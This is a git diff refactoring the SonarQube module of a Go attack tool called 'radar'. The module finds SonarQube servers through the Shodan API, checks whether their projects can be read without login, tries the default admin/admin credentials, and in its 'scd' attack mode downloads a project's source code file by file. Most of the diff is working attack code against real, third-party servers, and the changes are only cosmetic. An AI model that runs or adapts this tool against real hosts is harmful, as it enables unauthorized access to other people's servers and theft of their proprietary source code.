@@ -14,104 +14,76 @@ import (
 	"encoding/json"
 	"strconv"
 
+	"radar/internal/log"
 	"radar/internal/network"
-  "radar/internal/shodan"
-  "radar/internal/utils"
-  "radar/internal/log"
+	"radar/internal/shodan"
+	"radar/internal/utils"
 )
 
-var (
-	SONAR_URL_FORMAT = "http://%s:%d%s"
-
-	SONAR_LOGIN_PATH               = "/api/authentication/login"
-	SONAR_PUBLIC_PROJECT_PATH      = "/api/users/current"
-	SONAR_PROJECT_COUNT_PATH       = "/api/components/search_projects"
-	SONAR_PROJECT_ISSUE_COUNT_PATH = "/api/issues/search?resolved=false&facets=types&ps=1&additionalFields=_all"
-
-	SONAR_PROJECT_COMPONENT_PATH   = "/api/measures/component_tree?"
-	SONAR_PROJECT_COMPONENT_PARAM  = "metricKeys=ncloc&component=%s&p=%d&ps=%d"
-	SONAR_PROJECT_SOURCE_CODE_PATH = "/api/sources/lines?key=%s"
-
-	SONAR_DEFAULT_USER     = "admin"
-	SONAR_DEFAULT_PASSWORD = "admin"
-)
-
-type SonarQubeScanner struct {
-	Menu *flag.FlagSet
-
-	AttackType string
-
-	ShodanApiKey string
-
-	Port       int
-	Hostname   string
-	ProjectKey string
-}
-
-func NewSonarQubeScanner() *SonarQubeScanner {
-	sonarQubeScanner := &SonarQubeScanner{}
+// / Parse user supplied parameter and create a sonarqube scanner
+func NewScanner() *Scanner {
+	scanner := &Scanner{}
 
 	menu := flag.NewFlagSet("sonarqube", flag.ExitOnError)
 
-	menu.StringVar(&sonarQubeScanner.AttackType, "aT", "scan", "attack type: scan | scd (source code download)")
+	menu.StringVar(&scanner.AttackType, "aT", "scan", "attack type: scan | scd (source code download)")
+	menu.StringVar(&scanner.ShodanApiKey, "aK", "", "shodan api key (Required when attacktype scan)")
+	menu.IntVar(&scanner.Port, "p", 9000, "sonarqube port (Required when attacktype scd)")
+	menu.StringVar(&scanner.Hostname, "host", "", "sonarqube hostname or Ip (Required when attacktype scd)")
+	menu.StringVar(&scanner.ProjectKey, "pK", "", "project key that want to download source code (Required when attacktype scd)")
 
-	menu.StringVar(&sonarQubeScanner.ShodanApiKey, "aK", "", "shodan api key (Required when attacktype scan)")
+	scanner.Menu = menu
 
-	menu.IntVar(&sonarQubeScanner.Port, "p", 9000, "sonarqube port (Required when attacktype scd)")
-	menu.StringVar(&sonarQubeScanner.Hostname, "host", "", "sonarqube hostname or IP (Required when attacktype scd)")
-	menu.StringVar(&sonarQubeScanner.ProjectKey, "pK", "", "project key that want to download source code (Required when attacktype scd)")
-
-	menu.BoolVar(&log.VERBOSE, "v", false, "set true if want to see error logs")
-
-	sonarQubeScanner.Menu = menu
-
-	return sonarQubeScanner
+	return scanner
 }
 
-func (sonarqube SonarQubeScanner) Scan() {
-  var wg sync.WaitGroup
+// / Find sonarqube instance on shodan
+// / Detect misconfigured sonarqubes and show details
+func (sonarqube Scanner) Scan() {
+	var wg sync.WaitGroup
 
 	if sonarqube.ShodanApiKey == "" {
-		log.Stdout(log.Error, "Shodan Api Key is required for `scan` attack type", "")
+		log.Fail("Shodan Api Key is required for SonarQube attacks")
 		return
 	}
 
-  resultArray, err := shodan.Search(sonarqube.ShodanApiKey, "sonarqube")
-  if err != nil {
-    log.Stdout(log.Error, "SonarQube Scan ::: ", err.Error())
-    return 
-  }
+	searchResult, err := shodan.Search(sonarqube.ShodanApiKey, "sonarqube")
+	if err != nil {
+		// TODO - log.Stdout(log.Error, "", errors.Unwrap(err).Error())
+		return
+	}
 
-  fmt.Println(len(resultArray.Matches))
+	for _, result := range searchResult.Matches {
+		connection, err := network.HostConnection(result.Ip, result.Port)
 
-	for _, result := range resultArray.Matches {
-		status, conn := network.HostIsAccessible(result.Port, result.Ip_str)
-
-		if status {
-			go func(r shodan.HostSearchResult, c net.Conn) {
-				defer c.Close()
-				wg.Add(2)
-				checkSonarQubePublicProject(r, &wg)
-				checkSonarQubeDefaultCredential(r, &wg)
-			}(result, conn)
+		if err != nil {
+			// TODO -log.Stdout(log.Error, "", errors.Unwrap(err).Error())
+			break
 		}
+
+		go func(r shodan.Match, c net.Conn) {
+			defer c.Close()
+			wg.Add(2)
+			checkSonarQubeDetail(r, &wg)
+			checkDefaultCredential(r, &wg)
+		}(result, connection)
 	}
 
 	wg.Wait()
 }
 
-func (sonarqube SonarQubeScanner) Scd() {
+func (sonarqube Scanner) Scd() {
 	var wg sync.WaitGroup
 	components := getSonarQubeProjectFiles(sonarqube.Hostname, sonarqube.Port, sonarqube.ProjectKey, 1, 500)
 
 	if components == nil {
-		log.Stdout(log.Warning, "Could not found any code folder!", "")
+		log.Warning("Could not found any code folder!")
 		return
 	}
 
 	for i, fileComponent := range components {
 		if utils.Contains(fileComponent.Name, utils.CommonFileExtensions()) {
-			go func(file SonarProjectSubComponent) {
+			go func(file Component) {
 				wg.Add(1)
 				createSourceCodeFileViaSonarQube(sonarqube.Hostname, sonarqube.Port, sonarqube.ProjectKey, file, &wg)
 			}(fileComponent)
@@ -125,7 +97,7 @@ func (sonarqube SonarQubeScanner) Scd() {
 	wg.Wait()
 }
 
-func createSourceCodeFileViaSonarQube(hostname string, port int, projectKey string, file SonarProjectSubComponent, wg *sync.WaitGroup) {
+func createSourceCodeFileViaSonarQube(hostname string, port int, projectKey string, file Component, wg *sync.WaitGroup) {
 	defer wg.Done()
 
 	path := strings.Split(file.Path, file.Name)[0]
@@ -140,17 +112,17 @@ func createSourceCodeFileViaSonarQube(hostname string, port int, projectKey stri
 		return
 	}
 
-	log.Stdout(log.Warning, file.Key+" downloading", "")
+	log.Warning(file.Key + " downloading")
 	codeArray := getSonarQubeProjectCodes(hostname, port, file.Key)
 
 	if codeArray == nil {
-		log.Stdout(log.Error, file.Key+" was not downloaded", "")
+		log.Error(file.Key+" was not downloaded", err)
 		return
 	}
 
 	_, err = f.WriteString("//This code fetched by Radar")
 	if err != nil {
-		log.Stdout(log.Error, "An error occured when writing file"+file.Key, err.Error())
+		log.Error("An error occured when writing file"+file.Key, err)
 	}
 
 	for _, line := range codeArray.Sources {
@@ -158,51 +130,59 @@ func createSourceCodeFileViaSonarQube(hostname string, port int, projectKey stri
 
 		_, err = f.WriteString("\n" + c)
 		if err != nil {
-			log.Stdout(log.Error, "An error occured when writing file"+file.Key, err.Error())
+			log.Error("An error occured when writing file"+file.Key, err)
 		}
 	}
 
 	err = f.Close()
 	if err != nil {
-		log.Stdout(log.Error, "An error occured when closed"+file.Key, err.Error())
+		log.Error("An error occured when closed"+file.Key, err)
 	}
 }
 
-func checkSonarQubePublicProject(searchResult shodan.HostSearchResult, wg *sync.WaitGroup) {
+// / Get details on detected SonarQube
+// / Like issue, vulnerability, code smell counts, etc.
+func checkSonarQubeDetail(searchResult shodan.Match, wg *sync.WaitGroup) {
 	defer wg.Done()
 
-	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(SONAR_URL_FORMAT, searchResult.Ip_str, searchResult.Port, SONAR_PUBLIC_PROJECT_PATH), "")
+	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, searchResult.Ip, searchResult.Port, API_USER_CURRENT), "")
 	if err != nil {
+		//TODO - log.Stdout(log.Error, "sonarqube.checkSonarQubeDetail ::: ", err.Error())
 		return
 	}
 
 	_, statusCode, _, err := network.SendRequest(req)
 	if err != nil {
+		//TODO - log.Stdout(log.Error, "sonarqube.checkSonarQubeDetail ::: ", err.Error())
 		return
 	}
 
-	if statusCode != 200 {
-		log.Stdout(log.Fail, fmt.Sprintf("Public Project Not Accessible - %s:%d", searchResult.Ip_str, searchResult.Port), "")
+	if statusCode == 401 || statusCode == 403 {
+		log.Fail(fmt.Sprintf("SonarQube Projects Not Accessible - %s:%d", searchResult.Ip, searchResult.Port))
+		return
+	} else if statusCode != 200 {
+		log.Fail(fmt.Sprintf("SonarQube Return %d Status Code - %s:%d", statusCode, searchResult.Ip, searchResult.Port))
 		return
 	}
 
-	projectCount := getSonarQubeProjectCount(searchResult)
+	projectCount := getProjectCount(searchResult)
 
 	if projectCount > 0 {
-		codeSmell, vulnerability, bug, securityHotspot := getSonarQubeProjectIssuesCount(searchResult)
-		log.Stdout(log.Success, fmt.Sprintf(
-			"Public Project Accessible! - %s:%d\n[*******] Project Count: %d, Code Smell: %d, Vulnerability: %d, Bug: %d, Security Hotspot: %d",
-			searchResult.Ip_str, searchResult.Port, projectCount, codeSmell, vulnerability, bug, securityHotspot), "")
+		codeSmell, vulnerability, bug, securityHotspot := getProjectIssuesCount(searchResult)
+		log.Success(fmt.Sprintf(
+			"SonarQube Projects Accessible! - %s:%d\n[*******] Project Counts: %d, Code Smell: %d, Vulnerability: %d, Bug: %d, Security Hotspot: %d",
+			searchResult.Ip, searchResult.Port, projectCount, codeSmell, vulnerability, bug, securityHotspot))
 	} else {
-		log.Stdout(log.Success, fmt.Sprintf("Public Project Accessible But Empty - %s:%d", searchResult.Ip_str, searchResult.Port), "")
+		log.Success(fmt.Sprintf("SonarQube Projects Accessible But Empty - %s:%d", searchResult.Ip, searchResult.Port))
 	}
 }
 
-func checkSonarQubeDefaultCredential(searchResult shodan.HostSearchResult, wg *sync.WaitGroup) {
+func checkDefaultCredential(searchResult shodan.Match, wg *sync.WaitGroup) {
 	defer wg.Done()
 
-	req, err := network.PrepareRequest(network.PostRequest, fmt.Sprintf(SONAR_URL_FORMAT, searchResult.Ip_str, searchResult.Port, SONAR_LOGIN_PATH), fmt.Sprintf("login=%s&password=%s", SONAR_DEFAULT_USER, SONAR_DEFAULT_PASSWORD))
+	req, err := network.PrepareRequest(network.PostRequest, fmt.Sprintf(BASE_URL, searchResult.Ip, searchResult.Port, API_AUTHENTICATION_LOGIN), fmt.Sprintf("login=%s&password=%s", DEFAULT_USER, DEFAULT_PASSWORD))
 	if err != nil {
+		// TODO - log.Stdout(log.Error, "", err.Error())
 		return
 	}
 
@@ -210,55 +190,70 @@ func checkSonarQubeDefaultCredential(searchResult shodan.HostSearchResult, wg *s
 
 	_, statusCode, _, err := network.SendRequest(req)
 	if err != nil {
+		// TODO - log.Stdout(log.Error, "", err.Error())
 		return
 	}
 
 	if statusCode == 200 {
-		log.Stdout(log.Success, fmt.Sprintf("Default Credential Work - %s:%d", searchResult.Ip_str, searchResult.Port), "")
+		log.Success(fmt.Sprintf("Default Credential Work - %s:%d", searchResult.Ip, searchResult.Port))
 	} else {
-		log.Stdout(log.Fail, fmt.Sprintf("Default Credential Not Work - %s:%d", searchResult.Ip_str, searchResult.Port), "")
+		log.Fail(fmt.Sprintf("Default Credential Not Work - %s:%d", searchResult.Ip, searchResult.Port))
 	}
 }
 
-func getSonarQubeProjectCount(searchResult shodan.HostSearchResult) int {
-	result := SonarSearchProjects{}
+func getProjectCount(searchResult shodan.Match) int {
+	result := SearchProject{}
 
-	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(SONAR_URL_FORMAT, searchResult.Ip_str, searchResult.Port, SONAR_PROJECT_COUNT_PATH), "")
+	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, searchResult.Ip, searchResult.Port, API_COMPONENTS_SEARCH_PROJECTS), "")
 	if err != nil {
+		// TODO - log.Stdout(log.Error, "sonarqube.getProjectCount ::: ", err.Error())
 		return 0
 	}
 
-	body, _, _, err := network.SendRequest(req)
+	body, statusCode, _, err := network.SendRequest(req)
 	if err != nil {
+		// TODO - log.Stdout(log.Error, "sonarqube.getProjectCount ::: ", err.Error())
+		return 0
+	}
+
+	if statusCode != 200 {
+		// TODO - log.Stdout(log.Error, fmt.Sprintf("sonarqube.getProjectCount ::: SonarQube Return %d Status Code - %s:%d", statusCode, searchResult.Ip, searchResult.Port), "")
 		return 0
 	}
 
 	err = json.Unmarshal([]byte(body), &result)
 	if err != nil {
-		log.Stdout(log.Error, "An error occured when deserialize object", err.Error())
+		// TODO - log.Stdout(log.Error, "sonarqube.getProjectCount ::: An error occured when deserialize object", err.Error())
 		return 0
 	}
 
 	return result.Paging.Total
 }
 
-func getSonarQubeProjectIssuesCount(searchResult shodan.HostSearchResult) (int, int, int, int) {
-	result := SonarSearchIssues{}
+func getProjectIssuesCount(searchResult shodan.Match) (int, int, int, int) {
+	result := Issues{}
 	codeSmell, vulnerability, bug, securityHotspot := 0, 0, 0, 0
 
-	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(SONAR_URL_FORMAT, searchResult.Ip_str, searchResult.Port, SONAR_PROJECT_ISSUE_COUNT_PATH), "")
+	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, searchResult.Ip, searchResult.Port, API_ISSUE_SEARCH), "")
 	if err != nil {
+		// TODO - log.Stdout(log.Error, "sonarqube.getProjectIssuesCount ::: ", err.Error())
 		return 0, 0, 0, 0
 	}
 
-	body, _, _, err := network.SendRequest(req)
+	body, statusCode, _, err := network.SendRequest(req)
 	if err != nil {
+		// TODO - log.Stdout(log.Error, "sonarqube.getProjectIssuesCount ::: ", err.Error())
+		return 0, 0, 0, 0
+	}
+
+	if statusCode != 200 {
+		// TODO - log.Stdout(log.Error, fmt.Sprintf("sonarqube.getProjectIssuesCount ::: SonarQube Return %d Status Code - %s:%d", statusCode, searchResult.Ip, searchResult.Port), "")
 		return 0, 0, 0, 0
 	}
 
 	err = json.Unmarshal([]byte(body), &result)
 	if err != nil {
-		log.Stdout(log.Error, "An error occured when deserialize object", err.Error())
+		// TODO - log.Stdout(log.Error, "sonarqube.getProjectIssuesCount ::: An error occured when deserialize object", err.Error())
 		return 0, 0, 0, 0
 	}
 
@@ -280,10 +275,10 @@ func getSonarQubeProjectIssuesCount(searchResult shodan.HostSearchResult) (int, 
 	return codeSmell, vulnerability, bug, securityHotspot
 }
 
-func getSonarQubeProjectFiles(hostname string, port int, projectKey string, page int, count int) []SonarProjectSubComponent {
-	result := &SonarProjectComponentTree{}
+func getSonarQubeProjectFiles(hostname string, port int, projectKey string, page int, count int) []Component {
+	result := &ComponentTree{}
 
-	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(SONAR_URL_FORMAT, hostname, port, SONAR_PROJECT_COMPONENT_PATH+fmt.Sprintf(SONAR_PROJECT_COMPONENT_PARAM, projectKey, page, count)), "")
+	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, hostname, port, PROJECT_COMPONENT_PATH+fmt.Sprintf(PROJECT_COMPONENT_PARAM, projectKey, page, count)), "")
 	if err != nil {
 		return nil
 	}
@@ -294,13 +289,13 @@ func getSonarQubeProjectFiles(hostname string, port int, projectKey string, page
 	}
 
 	if statusCode != 200 {
-		log.Stdout(log.Error, "Server return error code "+strconv.Itoa(statusCode)+" when fetching code folder", "")
+		log.Error("Server return error code "+strconv.Itoa(statusCode)+" when fetching code folder", err)
 		return nil
 	}
 
 	err = json.Unmarshal([]byte(body), &result)
 	if err != nil {
-		log.Stdout(log.Error, "An error occured when deserialize object", err.Error())
+		log.Error("An error occured when deserialize object", err)
 		return nil
 	}
 
@@ -311,10 +306,10 @@ func getSonarQubeProjectFiles(hostname string, port int, projectKey string, page
 	return result.Components
 }
 
-func getSonarQubeProjectCodes(hostname string, port int, projectKey string) *SonarProjectCodes {
-	result := &SonarProjectCodes{}
+func getSonarQubeProjectCodes(hostname string, port int, projectKey string) *Line {
+	result := &Line{}
 
-	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(SONAR_URL_FORMAT, hostname, port, fmt.Sprintf(SONAR_PROJECT_SOURCE_CODE_PATH, projectKey)), "")
+	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, hostname, port, fmt.Sprintf(PROJECT_SOURCE_CODE_PATH, projectKey)), "")
 	if err != nil {
 		return nil
 	}
@@ -325,13 +320,13 @@ func getSonarQubeProjectCodes(hostname string, port int, projectKey string) *Son
 	}
 
 	if statusCode != 200 {
-		log.Stdout(log.Error, "Server return error code "+strconv.Itoa(statusCode), "")
+		log.Error("Server return error code "+strconv.Itoa(statusCode), err)
 		return nil
 	}
 
 	err = json.Unmarshal([]byte(body), &result)
 	if err != nil {
-		log.Stdout(log.Error, "An error occured when deserialize object", err.Error())
+		log.Error("An error occured when deserialize object", err)
 		return nil
 	}
 
